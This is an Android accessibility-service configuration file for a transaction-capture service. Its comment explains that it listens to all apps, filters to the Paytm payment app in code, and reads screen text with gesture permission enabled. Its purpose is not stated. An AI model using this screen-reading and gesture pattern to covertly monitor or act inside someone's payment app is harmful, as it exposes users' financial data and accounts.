<?xml version="1.0" encoding="utf-8"?>
<!-- Screen-reader capture config for TxnAccessibilityService.
     packageNames is intentionally omitted (listen to all, filter to Paytm in code) so a
     re-branded / updated Paytm build is still captured and its package can be confirmed
     from the in-app log. canRetrieveWindowContent is required to read screen text. -->
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:notificationTimeout="300"
    android:description="@string/accessibility_desc" />
